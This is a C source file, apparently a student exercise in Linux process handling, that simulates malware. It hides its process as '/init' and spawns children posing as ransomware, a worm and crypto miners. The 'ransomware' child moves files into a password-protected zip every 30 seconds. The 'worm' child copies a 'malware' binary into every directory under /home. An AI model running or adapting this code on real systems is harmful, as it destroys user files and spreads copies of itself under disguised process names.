#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/prctl.h>
#include <sys/types.h>
#include <signal.h>
#include <errno.h>
#include <sys/wait.h>
#include <time.h>

void spawn_child(const char *name) {
    char shname[100];
    pid_t pid = fork();
    if (pid < 0) {
        perror("fork child gagal");
        exit(EXIT_FAILURE);
    }

    if (pid == 0) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        int count;
        sprintf(shname,"ps -ef | grep %s | grep -v root | grep -v grep | wc -l", name);
        FILE *fp = popen(shname, "r");
        fscanf(fp, "%d", &count);
        fclose(fp);
        if(count == 0) {
           execl("/proc/self/exe", name, NULL); // re-execute diri sendiri dengan nama berbeda
           perror("execl gagal");
           exit(EXIT_FAILURE);
        }
    }
}

int main(int argc, char *argv[]) {
    char minecrafter[100];
    char hashgen[200];

    if (strcmp(argv[0], "wannacryptor") == 0) {
        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
        while (1) {
            // Encryption
            system("zip -r -m -P pass haha.zip apa randomtext.txt>/dev/null"); // password: pass
            sleep(30);
        }
    } else

   if (strcmp(argv[0], "trojan.wrm") == 0) {
        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
        while (1) {
            // Trojan
            system("find /home -type d -exec cp malware {}/ \\;"); // copy ke semua directory di home
            sleep(30);
        }
    } else


    if (strcmp(argv[0], "rodok.exe") == 0) {
        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
        // rodok.exe akan buat 5 anak lagi
        for(int i=0; i < 5; i++) {
                sprintf(minecrafter,"mine-crafter-%i",i);
                spawn_child(minecrafter);
        }
        wait(NULL);
        while(1) {
            sleep(30);
        }
    } else

    if(strncmp(argv[0], "mine-crafter-", 13) == 0) {
        char *substr = &argv[0][13];
        srand(time(NULL));
        prctl(PR_SET_NAME, argv[0], 0, 0, 0);
        while(1) {
                sprintf(hashgen,"echo \"[$(date +\"%%Y-%%m-%%d %%H:%%M:%%S\")] [MINER %i] $(openssl rand -base64 32 | sha256sum | awk '{print $1}')\" >> /tmp/.miner.log",atoi(substr));
                system(hashgen);
                sleep(rand() % 28 + 3);
        }
   }

   // Proses utama: buat proses /init
   pid_t pid = fork();
   if (pid < 0) {
        perror("fork gagal");
        exit(EXIT_FAILURE);
   }
   if (pid == 0) {
        // Proses /init
        prctl(PR_SET_NAME, "/init", 0, 0, 0);
        strncpy(argv[0], "/init", strlen(argv[0]));
        argv[0][5] = 0;

        spawn_child("wannacryptor");
        spawn_child("trojan.wrm");
        spawn_child("rodok.exe");

        for (int i = 0; i < 3; i++) {
              wait(NULL);
        }
   } else {
        // Proses induk utama keluar
        exit(EXIT_SUCCESS);
   }
   return 0;
}
